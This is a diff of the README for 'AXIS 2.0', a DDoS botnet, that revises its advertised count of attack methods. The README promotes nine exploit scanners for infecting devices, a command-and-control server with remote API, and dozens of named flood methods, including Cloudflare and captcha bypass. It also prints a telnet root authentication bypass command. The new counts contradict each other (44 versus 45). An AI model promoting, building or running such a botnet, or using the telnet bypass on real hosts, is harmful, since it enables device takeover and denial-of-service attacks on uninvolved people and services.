@@ -10,7 +10,7 @@
 - **9 Exploit Scanners** - Maximum infection vectors (most of any public botnet)
 - **Zinnet-Style UI** - Beautiful cyan/white/yellow interface with box decorations
 - **Layer-Based Attack Organization** - L3/L4/L7/Special method categorization
-- **60+ Attack Methods** - Comprehensive DDoS capabilities
+- **44 Unique Attack Methods** - Comprehensive DDoS capabilities
 - **Full API Support** - REST API for remote control
 - **Complete Database System** - User management, logging, whitelisting
 - **Telnet Authentication Bypass** - Exclusive exploit (`USER="-f root" telnet -a`)
@@ -112,30 +112,30 @@
 
 ---
 
-## 💀 60+ Attack Methods
+## 💀 45 Unique Attack Methods
 
 ### Layer 3 Attacks (UDP)
 ```
 udp, udpplain, std, nudp, udphex, socket-raw, samp,
 udp-strong, hex-flood, strong-hex, ovhudp, cudp, icee,
-randhex, ovh, ovhdrop, nfo, vse, dns
+randhex, ovhdrop, nfo
 ```
 
 ### Layer 4 Attacks (TCP)
 ```
 tcp, syn, ack, stomp, hex, stdhex, xmas, tcpall,
 tcpfrag, asyn, usyn, ackerpps, tcp-mix, tcpbypass,
-nfolag, ovhnuke, raw, greip, greeth
+nfolag, ovhnuke
 ```
 
 ### Layer 7 Attacks (HTTP/HTTPS)
 ```
-http, https, cf (Cloudflare bypass)
+http, https, cf (Cloudflare bypass), browserem (with captcha bypass)
 ```
 
 ### Special Attacks
 ```
-dns (DNS water torture), greip, greeth (GRE tunnels)
+vse, dns, greip, greeth, homeslam, udpbypass, mixed
 ```
 
 ---
@@ -220,7 +220,7 @@ AXIS 2.0/
 ├── cnc/                    # Command & Control server (Go)
 │   ├── main.go            # Main server, telnet/API listeners
 │   ├── admin.go           # Admin panel (zinnet-style UI)
-│   ├── attack.go          # Attack parsing, 60+ methods
+│   ├── attack.go          # Attack parsing, 44 unique methods
 │   ├── bot.go             # Bot connection handling
 │   ├── clientList.go      # Bot management
 │   ├── database.go        # MySQL integration
@@ -529,7 +529,7 @@ By using this software, you agree to:
 
 1. **9 Exploit Scanners** - More than any other public botnet
 2. **Zinnet-Style UI** - Beautiful, modern interface
-3. **60+ Attack Methods** - Comprehensive DDoS capabilities
+3. **44 Unique Attack Methods** - Comprehensive DDoS capabilities
 4. **Full Feature Merge** - Best of AXIS, zinnet, blackhole
 5. **Active Development** - Regular updates and improvements
 6. **Complete Documentation** - Extensive docs for all features
